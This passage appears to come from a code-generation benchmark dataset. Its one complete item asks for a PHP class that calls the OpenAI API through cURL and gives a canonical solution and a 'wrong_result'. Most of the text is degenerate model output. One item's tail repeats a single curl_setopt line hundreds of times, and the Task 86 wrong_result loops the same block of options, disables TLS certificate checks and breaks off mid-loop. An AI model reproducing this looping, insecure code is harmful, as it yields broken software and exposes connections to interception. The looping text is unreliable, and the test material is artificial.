true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true"
  },
  {
    "Task_id": 86,
    "Instruction": "Task Description: Create a PHP class that handles HTTP requests to the OpenAI API using cURL, with support for different content types, streaming, and proxy configuration.\n\nClass Description: The OpenAi class is designed to interact with OpenAI's API by sending HTTP requests. It manages API keys, request headers, content types, and provides configuration options for timeouts, proxies, and custom URLs. The class supports both JSON and multipart/form-data content types and can handle streaming responses.\n\nAttributes:\n\nengine: [string] - Default engine for API requests (default: \"davinci\")\nmodel: [string] - Default model for text completions (default: \"text-davinci-002\")\nchatModel: [string] - Default model for chat completions (default: \"gpt-3.5-turbo\")\nheaders: [array] - Array of HTTP headers to be sent with requests\ncontentTypes: [array] - Mapping of content types to their header strings\ntimeout: [int] - Timeout for cURL requests in seconds (default: 0)\nstream_method: [object] - Callback method for handling streamed responses\ncustomUrl: [string] - Custom base URL to override the default API endpoint\nproxy: [string] - Proxy server address for requests\ncurlInfo: [array] - Information about the last cURL request\n\nMethods:\n\n__construct: [function]($OPENAI_API_KEY) -> [void] - Initializes the class with an API key and sets default headers\nsendRequest: [function](string $url, string $method, array $opts = []) -> [bool|string] - Sends an HTTP request to the specified URL with given method and options\nbaseUrl: [function](string &$url) -> [void] - Modifies the URL to use a custom base URL if configured",
    "Canonical_solution": "namespace Orhanerday\\OpenAi;\n\nuse Exception;\n\nclass OpenAi\n{\n    private string $engine = \"davinci\";\n    private string $model = \"text-davinci-002\";\n    private string $chatModel = \"gpt-3.5-turbo\";\n    private array $headers;\n    private array $contentTypes;\n    private int $timeout = 0;\n    private object $stream_method;\n    private string $customUrl = \"\";\n    private string $proxy = \"\";\n    private array $curlInfo = [];\n\n    public function __construct($OPENAI_API_KEY)\n    {\n        $this->contentTypes = [\n            \"application/json\"    => \"Content-Type: application/json\",\n            \"multipart/form-data\" => \"Content-Type: multipart/form-data\",\n        ];\n\n        $this->headers = [\n            $this->contentTypes[\"application/json\"],\n            \"Authorization: Bearer $OPENAI_API_KEY\",\n        ];\n    }\n\n    /**\n     * @param  string  $url\n     * @param  string  $method\n     * @param  array   $opts\n     * @return bool|string\n     */\n    private function sendRequest(string $url, string $method, array $opts = [])\n    {\n        $post_fields = json_encode($opts);\n\n        if (array_key_exists('file', $opts) || array_key_exists('image', $opts)) {\n            $this->headers[0] = $this->contentTypes[\"multipart/form-data\"];\n            $post_fields      = $opts;\n        } else {\n            $this->headers[0] = $this->contentTypes[\"application/json\"];\n        }\n        $curl_info = [\n            CURLOPT_URL            => $url,\n            CURLOPT_RETURNTRANSFER => true,\n            CURLOPT_ENCODING       => '',\n            CURLOPT_MAXREDIRS      => 10,\n            CURLOPT_TIMEOUT        => $this->timeout,\n            CURLOPT_FOLLOWLOCATION => true,\n            CURLOPT_HTTP_VERSION   => CURL_HTTP_VERSION_1_1,\n            CURLOPT_CUSTOMREQUEST  => $method,\n            CURLOPT_POSTFIELDS     => $post_fields,\n            CURLOPT_HTTPHEADER     => $this->headers,\n        ];\n\n        if ($opts == []) {\n            unset($curl_info[CURLOPT_POSTFIELDS]);\n        }\n\n        if (!empty($this->proxy)) {\n            $curl_info[CURLOPT_PROXY] = $this->proxy;\n        }\n\n        if (array_key_exists('stream', $opts) && $opts['stream']) {\n            $curl_info[CURLOPT_WRITEFUNCTION] = $this->stream_method;\n        }\n\n        $curl = curl_init();\n\n        curl_setopt_array($curl, $curl_info);\n        $response = curl_exec($curl);\n\n        $info           = curl_getinfo($curl);\n        $this->curlInfo = $info;\n\n        curl_close($curl);\n\n        return $response;\n    }\n\n    /**\n     * @param  string  $url\n     */\n    private function baseUrl(string &$url)\n    {\n        if ($this->customUrl != \"\") {\n            $url = str_replace(Url::ORIGIN, $this->customUrl, $url);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 132,
    "wrong_result": "```php\nclass OpenAi {\n    private $engine = \"davinci\";\n    private $model = \"text-davinci-002\";\n    private $chatModel = \"gpt-3.5-turbo\";\n    private $headers = [];\n    private $contentTypes = [\n        \"json\" => \"application/json\",\n        \"multipart\" => \"multipart/form-data\"\n    ];\n    private $timeout = 0;\n    private $stream_method;\n    private $customUrl;\n    private $proxy;\n    private $curlInfo = [];\n\n    public function __construct($OPENAI_API_KEY) {\n        $this->headers = [\n            \"Authorization: Bearer \" . $OPENAI_API_KEY,\n            \"Content-Type: application/json\"\n        ];\n    }\n\n    public function sendRequest(string $url, string $method, array $opts = []) {\n        $ch = curl_init();\n        $this->baseUrl($url);\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_TIMEOUT, $this->timeout);\n        curl_setopt($ch, CURLOPT_PROXY, $this->proxy);\n        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);\n        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($ch, CURLOPT_ENCODING, \"\");\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);\n        curl_setopt($ch, CURLOPT_TIMEOUT, 30);\n        